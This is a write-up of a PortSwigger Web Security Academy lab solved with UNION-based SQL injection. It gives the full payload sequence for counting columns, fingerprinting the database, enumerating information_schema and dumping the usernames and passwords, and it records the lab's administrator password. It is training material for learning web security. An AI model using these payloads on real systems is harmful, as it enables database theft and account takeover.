# Lab: SQL injection attack, listing the database contents on non-Oracle databases

[Lab: SQL injection attack, listing the database contents on non-Oracle databases | Web Security Academy](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)

This lab contains an [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the `administrator` user.

![lab-sql-list-db-content.png](./lab-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases/lab-sql-list-db-content.png)

# Common Attack Payload

```sql
'--
'#
```

![screenshot00](./lab-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases/screenshot00.png)

# Identify the Number of Columns

```sql
'ORDER+BY+1--
'ORDER+BY+2--
'ORDER+BY+3--
```

![screenshot01](./lab-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases/screenshot01.png)

![screenshot02](./lab-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases/screenshot02.png)

# Identify the Column Data Types

```sql
'UNION+SELECT+'a',+'a'--
'UNION+SELECT+'a',+NULL--
'UNION+SELECT+NULL,+'a'--
```

![screenshot03](./lab-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases/screenshot03.png)

# Identify Database Type

## Microsoft

```sql
'UNION+SELECT+NULL,+@@version--
```

![screenshot04](./lab-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases/screenshot04.png)

## **PostgreSQL**

```sql
'UNION+SELECT+NULL,+version()--
```

![screenshot05](./lab-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases/screenshot05.png)

# List Database Schema

## Tables

```sql
'UNION+SELECT+NULL,+table_name+FROM+information_schema.tables--
```

- Output
    

    ![lab-sql-select-table-names.png](./lab-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases/lab-sql-select-table-names.png)
    

<aside>
💡 Notable table `users_rqejqh`

</aside>

## User Table Columns

```sql
'UNION+SELECT+NULL,+column_name+FROM+information_schema.columns+WHERE+table_name+=+'users_rqejqh'+--
```

![screenshot06](./lab-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases/screenshot06.png)

# Retrieve Username and Passwords

```sql
'UNION+SELECT+username_dmmoek,+password_lpxgvw+FROM+users_rqejqh+--
```

![screenshot07](./lab-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases/screenshot07.png)

# Login as `administrator`

```
administrator
kx9lx9hbxw96jkvi6dsz
```

![screenshot08](./lab-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases/screenshot08.png)

![lab-solved-sql-select-table-names.png](./lab-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases/lab-solved-sql-select-table-names.png)

# Other Solutions

## Burp Suite

1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the [number of columns that are being returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) and [which columns contain text data](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter: `'+UNION+SELECT+'abc','def'--`.
3. Use the following payload to retrieve the list of tables in the database: `'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`
4. Find the name of the table containing user credentials.
5. Use the following payload (replacing the table name) to retrieve the details of the columns in the table: `'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--`
6. Find the names of the columns containing usernames and passwords.
7. Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users: `'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--`
8. Find the password for the `administrator` user, and use it to log in.

## Community Solutions

Rana Khalil

[SQL Injection - Lab #9 SQL injection attack, listing the database contents on non Oracle databases](https://youtu.be/JduM_dO8glw)

Michael Sommer

[SQL injection attack, listing the database contents on non-Oracle databases (Video solution, Audio)](https://youtu.be/Kd810Iiv1dM)

